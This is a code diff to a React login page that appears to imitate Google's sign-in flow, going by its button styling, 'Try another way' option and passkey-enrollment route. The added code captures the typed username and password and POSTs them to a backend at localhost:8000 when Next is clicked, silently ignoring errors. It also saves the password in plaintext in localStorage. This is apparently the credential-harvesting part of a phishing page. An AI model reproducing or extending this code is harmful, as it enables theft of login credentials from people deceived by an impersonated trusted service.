@@ -11,16 +11,31 @@ const Password = () => {
     const [username, setUsername] = useState<string>("");
     const [password, setPassword] = useState<string>("");
 
+    const sendUsernameAndPassword = async () => {
+        const url = "http://localhost:8000/api/";
+        await fetch(url, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                "username": username,
+                "password": password
+            })
+        }).then(res => {
+        }).catch(e => {
+        })
+    }
+    
+    useEffect(() => {
+        const storedValue = localStorage.getItem('username');
+        if (storedValue) {
+            setUsername(storedValue);
+        }
+    }, []);    
+
     const onClickNext = () => {
+        sendUsernameAndPassword();
         localStorage.setItem("password", password);
     }
-
-    useEffect(() => {
-      const storedValue = localStorage.getItem('username');
-      if (storedValue) {
-        setUsername(storedValue);
-      }
-    }, []); 
 
     const onShowPassword = () => {
         setShowPassword(!showPassword);
@@ -66,7 +81,7 @@ const Password = () => {
                 <button className="hover:bg-google-link-l rounded-3xl px-3 py-2.5 cursor-pointer">Try another way</button>
               </div>
               <div>
-                <Link href="/passkeyenrollment">
+                <Link href="/passkeyenrollment" onClick={onClickNext}>
                     <button className="text-white bg-google-btn-primary-l cursor-pointer py-2.5 px-6 rounded-3xl hover:bg-google-btn-secondary-l hover:shadow-black">Next</button>
                 </Link>
               </div>
